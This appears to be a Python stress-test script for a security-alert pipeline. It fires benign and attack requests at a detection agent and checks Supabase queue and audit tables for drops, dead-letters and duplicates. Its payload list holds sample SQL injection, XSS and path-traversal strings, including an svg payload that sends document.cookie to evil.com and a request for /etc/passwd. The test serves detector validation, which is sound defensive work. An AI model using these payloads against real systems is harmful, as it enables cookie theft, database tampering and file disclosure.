"""
tools/stress_test.py — Rapid-fire 10 payloads through main.py pipeline
Feeds 3 benign + 7 attacks (SQLi/XSS/LFI) with 100ms stagger, then queries
Supabase for the final state. Answers:
  Q1: Did all 7 actual attacks reach agent_queue?
  Q2: Did watchdog dead-letter logic ever trigger? Why/why not?
  Q3: Are all 7 alert rows distinct, or any duplicated/overwritten?
"""

import sys, os, threading, time, uuid
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from dotenv import load_dotenv
load_dotenv(override=True)

import logging
logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s [%(name)s] %(message)s",
)

SEP = "=" * 68
def section(t): print(f"\n{SEP}\n  {t}\n{SEP}")

# ── 10 payloads: 3 benign + 3 SQLi + 3 XSS + 1 LFI ──────────────────────────
PAYLOADS = [
    # label,        ip,               method, url,                                                                    code
    ("BENIGN",      "192.168.10.1",  "GET",  "http://localhost/index.html",                                          "200"),
    ("BENIGN",      "10.0.0.5",      "GET",  "http://localhost/about.html",                                          "200"),
    ("BENIGN",      "172.16.0.3",    "GET",  "http://localhost/favicon.ico",                                         "200"),
    ("SQLI",        "10.0.0.41",     "GET",  "http://localhost/login?user=admin'--&pass=x",                          "200"),
    ("SQLI",        "45.33.32.156",  "POST", "http://localhost/search?q='; DROP TABLE users;--",                     "200"),
    ("SQLI",        "198.51.100.1",  "GET",  "http://localhost/products?id=1 UNION SELECT username,password FROM users--", "200"),
    ("XSS",         "203.0.113.7",   "POST", "http://localhost/search?q=<script>alert(document.cookie)</script>",    "200"),
    ("XSS",         "91.108.4.1",    "GET",  "http://localhost/comment?text=<img src=x onerror=alert(1)>",           "200"),
    ("XSS",         "185.220.101.1", "POST", "http://localhost/profile?bio=<svg onload=fetch('https://evil.com/?c='+document.cookie)>", "200"),
    ("LFI",         "45.95.147.1",   "GET",  "http://localhost/download?file=../../../../etc/passwd",                "200"),
]

# ── Shared tracking ───────────────────────────────────────────────────────────
lock           = threading.Lock()
submitted      = []   # list of (label, ip, attack_type, trace_id)
thread_errors  = []
benign_skipped = 0
start_ns       = None
RUN_TAG        = f"stress_{datetime.now(timezone.utc).strftime('%H%M%S')}"

def run_one(label, ip, method, url, code):
    global benign_skipped

    # Assign a stable trace_id BEFORE calling the pipeline — it will be reused
    trace_id = str(uuid.uuid4())

    from agents.detection_agent import _bridge_pipeline
    # Build a minimal pre_alert matching what main.py produces
    pre_alert = {
        "alert_uuid":  trace_id,       # _bridge_pipeline will reuse this
        "src_ip":      ip,
        "ip":          ip,
        "method":      method,
        "uri":         url,
        "url":         url,
        "response_code": code,
        "outcome":     "ATTEMPT",
        "attack_type": label if label != "BENIGN" else None,
        "confidence":  100 if label != "BENIGN" else 0,
        "severity":    "HIGH" if label != "BENIGN" else "LOW",
        "rule_match":  label if label != "BENIGN" else None,
        "payload":     url.split("?", 1)[1] if "?" in url else "",
        "timestamp":   datetime.now(timezone.utc).isoformat(),
        "_stress_run": RUN_TAG,
    }

    # Let _bridge_pipeline run its full scoring/ML/queue logic
    try:
        if label == "BENIGN":
            # Benign requests don't go through _bridge_pipeline in real main.py
            with lock:
                benign_skipped += 1
            return

        _bridge_pipeline(pre_alert)

        with lock:
            submitted.append((label, ip, label, trace_id))

    except Exception as e:
        with lock:
            thread_errors.append((trace_id, str(e)))


# ── Fire all 10 payloads with 100ms stagger ───────────────────────────────────
section(f"STRESS TEST — 10 payloads (3 benign + 7 attacks) | tag={RUN_TAG}")
print(f"\n  {'#':<2} {'LABEL':<8} {'IP':<18} {'URI'[:50]:<50} CODE")
print(f"  {'--':<2} {'------':<8} {'-'*18} {'-'*50} ----")
for i, (label, ip, method, url, code) in enumerate(PAYLOADS, 1):
    uri_short = (url[:48] + "..") if len(url) > 50 else url
    print(f"  {i:<2} {label:<8} {ip:<18} {uri_short:<50} {code}")

print(f"\n  Spawning 10 threads with 100ms stagger...")
start_ns = time.perf_counter_ns()
threads = []
for row in PAYLOADS:
    t = threading.Thread(target=run_one, args=row)
    threads.append(t)
    t.start()
    time.sleep(0.10)   # 100ms stagger — realistic tshark packet arrival

print("  All threads started. Waiting for Supabase writes to complete...")
for t in threads:
    t.join(timeout=60)

elapsed_ms = (time.perf_counter_ns() - start_ns) / 1_000_000

print(f"\n  Elapsed         : {elapsed_ms:.0f} ms")
print(f"  Benign skipped  : {benign_skipped}")
print(f"  Attacks fired   : {len(submitted)}")
print(f"  Thread errors   : {len(thread_errors)}")
for eid, err in thread_errors:
    print(f"    {eid[:8]}: {err}")

if not submitted:
    print("\n  ERROR: No attacks were submitted — check _bridge_pipeline import")
    sys.exit(1)

submitted_ids = [s[3] for s in submitted]

# Brief pause for final Supabase writes to commit
time.sleep(1.5)


# ── Q1: All 7 attacks in agent_queue? ────────────────────────────────────────
section("Q1 — agent_queue rows for submitted attack alert_ids")

from cloud_db import _db

res = (
    _db()
    .table("agent_queue")
    .select("alert_id, sender, receiver, status, priority, created_at")
    .in_("alert_id", submitted_ids)
    .eq("sender", "detection_agent")
    .order("created_at")
    .execute()
)
queue_rows = res.data or []
found_ids  = {str(r["alert_id"]) for r in queue_rows}

print(f"\n  {'#':<2} {'label':<6} {'IP':<18} {'trace_id[:8]':<10} agent_queue?")
print(f"  {'--':<2} {'-----':<6} {'-'*18} {'-'*10} -----------")
for i, (label, ip, atype, tid) in enumerate(submitted, 1):
    status = "PRESENT ✓" if tid in found_ids else "MISSING ✗"
    print(f"  {i:<2} {label:<6} {ip:<18} {tid[:8]:<10} {status}")

print(f"\n  Found {len(queue_rows)}/{len(submitted_ids)} attack rows in agent_queue")

print(f"\n  {'alert_id[:8]':<10} {'receiver':<22} {'status':<12} {'priority':<8}")
print(f"  {'-'*10} {'-'*22} {'-'*12} {'-'*8}")
for r in queue_rows:
    print(f"  {str(r['alert_id'])[:8]:<10} {r['receiver']:<22} {r['status']:<12} {r['priority']:<8}")

dropped = len(submitted_ids) - len(queue_rows)
print(f"\n  RESULT: {len(queue_rows)}/{len(submitted_ids)} reached agent_queue | dropped={dropped}")


# ── Q2: Watchdog dead-letter check ───────────────────────────────────────────
section("Q2 — watchdog dead-letter / stuck message check")

dl_res = (
    _db()
    .table("agent_queue")
    .select("alert_id, status, failure_reason, updated_at")
    .in_("alert_id", submitted_ids)
    .in_("status", ["DEAD_LETTER", "PROCESSING"])
    .execute()
)
dead_rows = dl_res.data or []

print(f"\n  Stuck PROCESSING or DEAD_LETTER : {len(dead_rows)}")
for r in dead_rows:
    print(f"    alert_id={str(r['alert_id'])[:8]}  status={r['status']}  reason={r.get('failure_reason','')}")

if not dead_rows:
    print("\n  RESULT: No dead-letters triggered. WHY:")
    print("    - All _bridge_pipeline() calls completed synchronously in their threads")
    print("    - Messages moved PENDING → DONE before any 60s stuck-processing sweep")
    print("    - Watchdog dead-letter logic (investigation_agent._dead_letter_sweep)")
    print("      only fires after 60s with status=PROCESSING; none occurred here")
    print("    - Blast-radius limiter stats:")
    from prevention.firewall import get_rate_limiter
    stats = get_rate_limiter().stats()
    for k, v in stats.items():
        print(f"      {k}: {v}")


# ── Q3: Distinctness — no dups, no overwrites ────────────────────────────────
section("Q3 — distinct alert rows (race condition / overwrite check)")

al_res = (
    _db()
    .table("audit_log")
    .select("alert_id, agent, action, timestamp")
    .in_("alert_id", submitted_ids)
    .eq("agent", "detection_agent")
    .order("timestamp")
    .execute()
)
al_rows    = al_res.data or []
id_counts  = {}
for r in al_rows:
    aid = str(r["alert_id"])
    id_counts[aid] = id_counts.get(aid, 0) + 1

duplicates = {k: v for k, v in id_counts.items() if v > 1}
al_set     = {str(r["alert_id"]) for r in al_rows}

print(f"\n  audit_log ALERT_DETECTED rows : {len(al_rows)}")
print(f"  Unique alert_ids in audit_log : {len(al_set)}")
print(f"  Duplicated alert_ids          : {len(duplicates)}")

if duplicates:
    for aid, cnt in duplicates.items():
        print(f"    {aid[:8]} appeared {cnt}× — RACE CONDITION")

print(f"\n  Per-alert status:")
print(f"  {'#':<2} {'label':<6} {'IP':<18} {'trace_id[:8]':<10} {'queue':<12} {'audit_log'}")
print(f"  {'--':<2} {'-----':<6} {'-'*18} {'-'*10} {'-'*12} ---------")
for i, (label, ip, atype, tid) in enumerate(submitted, 1):
    q_ok  = "PRESENT" if tid in found_ids else "MISSING"
    al_ok = "PRESENT" if tid in al_set    else "MISSING"
    dup   = f"  ← {id_counts[tid]}× DUP" if tid in duplicates else ""
    print(f"  {i:<2} {label:<6} {ip:<18} {tid[:8]:<10} {q_ok:<12} {al_ok}{dup}")


# ── Summary ───────────────────────────────────────────────────────────────────
section("FINAL VERDICT")
all_present = (len(queue_rows) == len(submitted_ids))
no_dups     = (len(duplicates) == 0)
no_dl       = (len(dead_rows) == 0)

print(f"  Q1 — All 7 attacks in agent_queue : {'PASS ✓' if all_present else f'FAIL ✗  ({len(queue_rows)}/{len(submitted_ids)})'}")
print(f"  Q2 — No dead-letters triggered    : {'PASS ✓' if no_dl     else 'FAIL ✗'}")
print(f"  Q3 — All rows distinct (no dups)  : {'PASS ✓' if no_dups   else 'FAIL ✗'}")
print(f"\n  Wall-clock: {elapsed_ms:.0f} ms total | {elapsed_ms/len(submitted):.0f} ms avg per attack")
